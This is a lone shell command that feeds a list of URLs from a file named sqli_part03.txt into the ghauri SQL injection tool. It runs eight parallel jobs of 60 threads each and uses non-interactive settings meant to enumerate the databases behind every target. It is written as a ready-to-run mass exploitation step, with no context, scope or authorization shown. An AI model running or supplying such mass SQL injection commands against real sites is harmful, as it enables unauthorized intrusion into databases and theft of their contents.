cat sqli_part03.txt | rush -k -j 8 'bash -c "ghauri --url \"{}\" --dbs --confirm --timeout 10 --threads 60 --level 3 --flush-session --fresh-queries --technique BT --batch"'
